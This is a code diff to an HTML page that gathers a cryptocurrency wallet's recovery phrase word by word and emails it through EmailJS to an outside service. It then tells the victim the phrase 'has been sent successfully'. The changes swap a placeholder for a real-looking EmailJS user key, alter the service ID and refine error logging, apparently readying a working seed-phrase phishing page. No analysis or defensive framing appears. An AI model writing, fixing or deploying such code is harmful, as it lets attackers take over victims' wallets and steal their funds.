@@ -69,10 +69,10 @@
   <button id="sendBtn" onclick="sendData()" disabled>Send</button>
 </div>
 
-<!-- EmailJS Script - بدون فاصله اضافی -->
+<!-- EmailJS Script -->
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com @3/dist/email.min.js"></script>
 <script>
-  emailjs.init("user_1234567890");
+  emailjs.init("j5TwkKpUb71arrXnk"); // YOUR_USER_ID
 
   function showPage2() {
     document.getElementById("page1").style.display = "none";
@@ -112,14 +112,14 @@
       phrases.push(value);
     }
 
-    emailjs.send("service_thzero", "_ejs-test-mail-service_", {
+    emailjs.send("service_thzerol", "__ejs-test-mail-service__", {
       recovery_phrase: phrases.join(" ")
     })
     .then(() => {
       alert("Your recovery phrase has been sent successfully!");
     })
     .catch(err => {
-      console.error(err);
+      console.error("Error sending data:", err);
       alert("Error sending data. Please try again.");
     });
   }
